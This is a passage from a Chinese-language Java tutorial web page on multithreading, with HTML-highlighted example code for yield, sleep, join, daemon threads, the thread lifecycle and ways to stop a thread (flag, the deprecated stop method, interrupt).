2、让步之后回到争夺队列中没有争夺到执行权，让其它线程执行</span><br>            &#125;<br>            System.out.println(<span class="hljs-built_in">this</span>.getName() + <span class="hljs-string">&quot;: &quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br>-------------------------------------------------<br><span class="hljs-keyword">package</span> demo06;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  yield</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建线程</span><br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;线程01&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;线程02&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;线程03&quot;</span>);<br><br>        <span class="hljs-comment">//开启线程</span><br>        t01.start();<br>        t02.start();<br>        t03.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>sleep</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo07;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">51</span>; i++) &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>.getName() + <span class="hljs-string">&quot;正在打出第&quot;</span> + i + <span class="hljs-string">&quot;招式&quot;</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//当每个线程遇到sleep方法时都会去停留0.2秒，之后重新回到争夺队列中再次争夺执行权</span><br>                Thread.sleep(<span class="hljs-number">200</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>----------------------------------------------------------------<br><span class="hljs-keyword">package</span> demo07;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  sleep</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建线程</span><br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;黄固&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;欧阳锋&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;段智兴&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t04</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;洪七公&quot;</span>);<br><br>        <span class="hljs-comment">//开启线程</span><br>        t01.start();<br>        t02.start();<br>        t03.start();<br>        t04.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>join</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo08;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        String[] songs = &#123;<br>            <span class="hljs-string">&quot;说天亲，天可不算亲，天有日月和星辰。&quot;</span>,<br>            <span class="hljs-string">&quot;日月穿梭催人老，带走世上多少的人。&quot;</span>,<br>            <span class="hljs-string">&quot;说天不亲，天也是亲。 天上明月共星辰，&quot;</span>,<br>            <span class="hljs-string">&quot;万物生长靠太阳，从古到如今。&quot;</span>,<br>            <span class="hljs-string">&quot;说地亲，地也不算亲，地长万物似黄金。&quot;</span>,<br>            <span class="hljs-string">&quot;争名夺利有多少载，看罢新坟看旧坟。&quot;</span>,<br>            <span class="hljs-string">&quot;说地不亲，地也是亲、 一方水土养一方人，&quot;</span>,<br>            <span class="hljs-string">&quot;五谷杂粮把咱养，世上难找回心的人&quot;</span>,<br>            <span class="hljs-string">&quot;说爹妈亲，爹妈可不算亲，爹妈不能永生存。&quot;</span>,<br>            <span class="hljs-string">&quot;满堂的儿女留也留不住，一捧黄土雨泪纷纷。&quot;</span>,<br>            <span class="hljs-string">&quot;说爹妈不亲，爹妈最最亲， 爹妈把我养成人，&quot;</span>,<br>            <span class="hljs-string">&quot;为了儿女赞家业，省吃简用不舍半分文。&quot;</span>,<br>            <span class="hljs-string">&quot;说儿子亲，不算个亲，人留后代草留根。&quot;</span>,<br>            <span class="hljs-string">&quot;八抬大轿把媳妇娶，儿子送给老丈人。&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; songs.length; i++) &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>.getName() + <span class="hljs-string">&quot;正在唱：&quot;</span> + songs[i]);<br>        &#125;<br>    &#125;<br>&#125;<br>--------------------------------------------------------<br><span class="hljs-keyword">package</span> demo08;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO join</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo08</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-comment">//创建线程</span><br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;郭德纲&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;郭麒麟&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;郭汾阳&quot;</span>);<br><br>        <span class="hljs-comment">//开启线程</span><br>        t01.start();<br>        t01.join();<span class="hljs-comment">//等老郭退休了，两个儿子才有机会唱这个曲儿</span><br><br>        t02.start();<br>        t03.start();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>setDaemon</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo01;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO   自定义线程类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        String[] learn = &#123;<br>            <span class="hljs-string">&quot;人之初，性本善。&quot;</span>,<br>            <span class="hljs-string">&quot;性相近，习相远。&quot;</span>,<br>            <span class="hljs-string">&quot;苟不教，性乃迁。&quot;</span>,<br>            <span class="hljs-string">&quot;教之道，贵以专。&quot;</span>,<br>            <span class="hljs-string">&quot;昔孟母，择邻处。&quot;</span>,<br>            <span class="hljs-string">&quot;子不学，断机杼。&quot;</span>,<br>            <span class="hljs-string">&quot;窦燕山，有义方。&quot;</span>,<br>            <span class="hljs-string">&quot;教五子，名俱扬。&quot;</span>,<br>            <span class="hljs-string">&quot;养不教，父之过。&quot;</span>,<br>            <span class="hljs-string">&quot;教不严，师之惰。&quot;</span>,<br>            <span class="hljs-string">&quot;子不学，非所宜。&quot;</span>,<br>            <span class="hljs-string">&quot;幼不学，老何为。&quot;</span>,<br>            <span class="hljs-string">&quot;玉不琢，不成器。&quot;</span>,<br>            <span class="hljs-string">&quot;人不学，不知义。&quot;</span>,<br>            <span class="hljs-string">&quot;为人子，方少时。&quot;</span>,<br>            <span class="hljs-string">&quot;亲师友，习礼仪。&quot;</span>,<br>            <span class="hljs-string">&quot;人之初，性本善。&quot;</span>,<br>            <span class="hljs-string">&quot;性相近，习相远。&quot;</span>,<br>            <span class="hljs-string">&quot;苟不教，性乃迁。&quot;</span>,<br>            <span class="hljs-string">&quot;教之道，贵以专。&quot;</span>,<br>            <span class="hljs-string">&quot;昔孟母，择邻处。&quot;</span>,<br>            <span class="hljs-string">&quot;子不学，断机杼。&quot;</span>,<br>            <span class="hljs-string">&quot;窦燕山，有义方。&quot;</span>,<br>            <span class="hljs-string">&quot;教五子，名俱扬。&quot;</span>,<br>            <span class="hljs-string">&quot;养不教，父之过。&quot;</span>,<br>            <span class="hljs-string">&quot;教不严，师之惰。&quot;</span>,<br>            <span class="hljs-string">&quot;子不学，非所宜。&quot;</span>,<br>            <span class="hljs-string">&quot;幼不学，老何为。&quot;</span>,<br>            <span class="hljs-string">&quot;玉不琢，不成器。&quot;</span>,<br>            <span class="hljs-string">&quot;人不学，不知义。&quot;</span>,<br>            <span class="hljs-string">&quot;为人子，方少时。&quot;</span>,<br>            <span class="hljs-string">&quot;亲师友，习礼仪。--------------------&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; learn.length; i++) &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>.getName() + <span class="hljs-string">&quot;正在背诵&quot;</span> +learn[i]);<br>        &#125;<br>    &#125;<br>&#125;<br>-------------------------------------------------<br><span class="hljs-keyword">package</span> demo01;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  setDaemon</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建线程</span><br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;张三&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;李四&quot;</span>);<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-string">&quot;王五&quot;</span>);<br><br>        <span class="hljs-comment">//设置守护线程</span><br>        t01.setDaemon(<span class="hljs-literal">true</span>);<br>        t02.setDaemon(<span class="hljs-literal">true</span>);<br>        t03.setDaemon(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//守护没有被标记守护线程的线程</span><br><br>        <span class="hljs-comment">//启动线程</span><br>        t01.start();<br>        t02.start();<br>        t03.start();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;我正在说第&quot;</span> + i +<span class="hljs-string">&quot;句话&quot;</span>);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;安静，上课了！&quot;</span>);<br>        <span class="hljs-comment">//当主线程执行完毕后，其它线程不会再争夺新的执行权。</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="9b6af95e"></a></p><h3 id="1-7-线程的生命周期"><a href="#1-7-线程的生命周期" class="headerlink" title="1.7 - 线程的生命周期"></a>1.7 - 线程的生命周期</h3><ul><li>新建：创建线程对象（通过start方法进入到下一个状态）</li><li>就绪：有执行资格，但是没有执行权，需要抢CPU执行权</li><li>运行：有执行资格，并且也有执行权，但是也有可能会被其它线程抢走，如果遇到了阻塞式方法，会在阻塞式方法运行结束之后回到就绪状态，继续争夺CPU执行权</li><li>死亡：成为垃圾，等待被回收<br>  <a name="95096397"></a></li></ul><h3 id="1-8-线程的停止"><a href="#1-8-线程的停止" class="headerlink" title="1.8 - 线程的停止"></a>1.8 - 线程的停止</h3><p>停止线程意味着线程完成任务之前，需要结束正在执行的操作<br>1、使用标志的方法来退出程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  自定义线程类  使用标志方式停止线程</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//标志默认为true</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">while</span> (flag)&#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()));<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;线程运行结束！~~~~~~~~~&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//当前方法被调用后，会改变flag的值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stopThread</span><span class="hljs-params">()</span>&#123;<br>        flag = <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br>------------------------------------------------------------<br><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();<span class="hljs-comment">//创建线程</span><br>        t01.start();<span class="hljs-comment">//开启线程</span><br>        Thread.sleep(<span class="hljs-number">2000</span>);<br>        t01.stopThread();<span class="hljs-comment">//标记设置为false</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2 - 使用stop方法强制停止线程，导致出现异常，善后工作处理不完整同时会释放锁，可能导致数据不同步，出现数据安全的问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo03;<br><br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  自定义线程类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()));<br>                Thread.sleep(<span class="hljs-number">5000</span>);<span class="hljs-comment">//每5秒执行一次</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">catch</span> (ThreadDeath e)&#123;<span class="hljs-comment">//捕获stop方法产生的异常</span><br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br>----------------------------------------------------------<br><span class="hljs-keyword">package</span> demo03;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  stop测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();<br>        t01.start();<span class="hljs-comment">//开启线程</span><br>        Thread.sleep(<span class="hljs-number">2000</span>);<span class="hljs-comment">//使主线程睡眠2秒钟</span><br>        t01.stop();<span class="hljs-comment">//调用stop方法强制停止线程</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>3 - 使用interruput和isinterrupted方法配合终止线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo04;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span 